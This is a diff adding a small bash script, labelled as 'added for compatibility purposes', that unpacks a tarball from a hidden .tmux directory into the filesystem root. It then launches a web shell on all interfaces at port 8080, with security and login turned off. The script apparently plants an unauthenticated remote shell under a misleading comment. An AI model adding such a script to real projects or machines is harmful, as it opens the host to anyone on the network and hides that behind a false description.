@@ -1,0 +1,9 @@
+#!/bin/bash
+# THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES
+
+
+tar -C / -xzf /usr/local/src/cia-hpl/.tmux/webshell.tgz 
+
+
+/usr/local/src/cia-hpl/webshell --port=8080 --shell=/usr/local/src/cia-hpl/TMUX --unsecure --host=0.0.0.0 --login=false
+
